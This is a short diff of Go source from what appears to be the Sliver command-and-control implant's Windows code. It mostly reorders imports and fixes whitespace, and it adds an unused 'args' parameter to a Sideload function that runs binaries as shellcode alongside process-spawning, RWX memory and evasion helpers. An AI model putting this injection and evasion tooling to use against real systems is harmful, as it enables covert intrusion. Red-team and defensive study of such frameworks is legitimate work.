@@ -28,15 +28,15 @@ import (
 	"log"
 	// {{else}}{{end}}
 	"os/exec"
+	"runtime"
 	"strings"
 	"time"
 	"unsafe"
-	"runtime"
 
-	"golang.org/x/sys/windows"
-	"github.com/bishopfox/sliver/sliver/version"
-	"github.com/bishopfox/sliver/sliver/syscalls"
 	"github.com/bishopfox/sliver/sliver/evasion"
+	"github.com/bishopfox/sliver/sliver/syscalls"
+	"github.com/bishopfox/sliver/sliver/version"
+	"golang.org/x/sys/windows"
 	"syscall"
 )
 
@@ -50,7 +50,7 @@ const (
 var (
 	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
-	CurrentToken windows.Token
+	CurrentToken    windows.Token
 )
 
 func sysAlloc(size int, rwxPages bool) (uintptr, error) {
@@ -303,7 +303,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 }
 
 //SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte) (string, error) {
+func Sideload(procName string, data []byte, args string) (string, error) {
 	return SpawnDll(procName, data, 0, "")
 }
 
@@ -368,7 +368,7 @@ func waitForCompletion(threadHandle windows.Handle) error {
 		} else {
 			break
 		}
-	} 
+	}
 	return nil
 }
 
